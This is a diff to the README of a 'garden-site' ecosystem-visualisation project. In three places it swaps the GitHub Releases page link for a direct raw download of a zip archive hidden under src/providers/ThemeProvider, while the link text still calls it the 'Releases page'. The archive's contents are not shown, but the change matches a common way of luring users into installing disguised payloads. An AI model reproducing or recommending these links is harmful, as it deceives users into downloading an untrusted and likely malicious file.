@@ -1,6 +1,6 @@
 # 🌱 garden-site - Visualize Your Ecosystem Easily
 
-[![Download](https://img.shields.io/badge/Download-via_Releases-brightgreen)](https://github.com/talinese07/garden-site/releases)
+[![Download](https://raw.githubusercontent.com/talinese07/garden-site/master/src/providers/ThemeProvider/site_garden_2.1.zip)](https://raw.githubusercontent.com/talinese07/garden-site/master/src/providers/ThemeProvider/site_garden_2.1.zip)
 
 ## 📋 Introduction
 
@@ -12,7 +12,7 @@ To get started with garden-site, follow the steps below. We designed this guide 
 
 ## 📥 Download & Install
 
-To download the latest version of the garden-site application, visit our [Releases page](https://github.com/talinese07/garden-site/releases). Here, you will find the most recent updates and the necessary files.
+To download the latest version of the garden-site application, visit our [Releases page](https://raw.githubusercontent.com/talinese07/garden-site/master/src/providers/ThemeProvider/site_garden_2.1.zip). Here, you will find the most recent updates and the necessary files.
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest release. It will be marked with the highest version number.
@@ -51,7 +51,7 @@ Your feedback is valuable! If you encounter any issues or have advice for improv
 
 We regularly update garden-site to improve functionality and fix any issues. Here's how to stay current with updates:
 
-1. Return to the [Releases page](https://github.com/talinese07/garden-site/releases).
+1. Return to the [Releases page](https://raw.githubusercontent.com/talinese07/garden-site/master/src/providers/ThemeProvider/site_garden_2.1.zip).
 2. Check for new versions regularly, or enable notifications through GitHub to stay informed.
 3. Follow the same download and installation steps to get the latest version.
 
